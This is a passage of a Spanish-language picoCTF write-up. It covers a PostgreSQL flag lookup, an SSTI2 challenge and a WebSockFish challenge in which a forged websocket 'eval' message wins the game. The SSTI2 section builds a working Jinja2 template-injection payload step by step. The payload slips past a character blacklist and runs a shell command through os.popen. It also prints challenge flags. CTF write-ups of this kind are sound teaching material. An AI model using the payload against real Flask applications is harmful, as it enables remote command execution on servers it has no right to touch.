3. Usamos ``\?`` para ver los comandos de psql
4. Usamos ``\l`` para ver todas las bases de datos disponibles en el servidor
```sql
Listado de base de datos
  Nombre   |  Dueño   | Codificación | Proveedor de locale |  Collate   |   Ctype    | Configuración regional | Reglas ICU: |      Privilegios      
-----------+----------+--------------+---------------------+------------+------------+------------------------+-------------+-----------------------
 pico      | postgres | UTF8         | libc                | en_US.utf8 | en_US.ut
 postgres  | postgres | UTF8         | libc                | en_US.utf8 | en_US.ut
 template0 | postgres | UTF8         | libc                | en_US.utf8 | en_US.ut  template1 | postgres | UTF8         | libc                | en_US.utf8 | en_US.ut

(4 filas)
```

5. Vemos que pico es una base de datos válida y el usuario postgres tiene acceso, o sea nosotros
6. Nos conectamos a la base de datos pico
```
pico=# \c pico
```

7. Listamos las tablas disponibles
```sql
pico=# \dt 
Listado de relaciones
 Esquema | Nombre | Tipo  |  Dueño   
---------+--------+-------+----------
 public  | flags  | tabla | postgres
(1 fila)
```

8. Vemos que sólo hay una tabla disponible llamada flags. Extraemos los datos de flags
```
SELECT * FROM flags;
```

9. Obtenemos la bandera
```sql
pico=# SELECT * FROM flags;
 id | firstname | lastname  |                address                 
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_73b0678f}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 filas)
```



## SSTI2

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:65369/)!

Server Side Template Injection
Why is blacklisting characters a bad idea to sanitize input?

1. Ingresamos al sitio web
2. Aprovechamos una vulnerabilidad de Server-Side Template Injection (SSTI) en un sistema basado en Jinja2, motor de plantillas utilizado en Flask. Creamos un payload que aproveche la capacidad de Jinja2 para evaluar expresiones dentro de las plantillas y accede progresivamente a objetos internos hasta ejecutar un comando en el sistema.
3. Damos acceso al objeto 
```
{{ request }}
```
4. Obtenemos la instancia de la aplicación Flask
```
{{ request|attr('application') }}
```
5. Accedemos a las variables globales
```
{{ request|attr('application')|attr('__globals__') }}
```
6. Cargamos las funciones nativas de Python
```
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__') }}
```
7. Importamos el módulo ``os``
```
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os') }}
```
8. Ejecutamos el comando introduciéndolo en la caja de texto de búsqueda y dando enter
```
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('cat flag')|attr('read')() }}
```
8. Obtenemos la bandera
```
picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}
```



## WebSockFish

Can you win in a convincing manner against this chess bot? He won't go easy on you! You can find the challenge [here](http://verbal-sleep.picoctf.net:57518/).

Try understanding the code and how the websocket client is interacting with the server

1. Ingresamos al sitio web
2. Al inspeccionar el código fuente nos damos cuenta que el juego utiliza WebStockets para intercambiar datos en tiempo real entre el cliente y el servidor. El juego muestra mensajes dentro de un chat, o sea que el servidor responde ante ciertas acciones. 
3. Inspeccionar
4. Consola
5. Probamos enviando mensajes de "mate" pero el resultado es indefinido
6. Descubrimos que el sistema maneja números para evaluar las jugadas, pero no se validaban correctamente, así que, enviamos un número negativo grande con el mensaje "eval" y obtenemos la bandera
```
sendMessage("eval -100000")

output: 
Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_c0789e29}
```


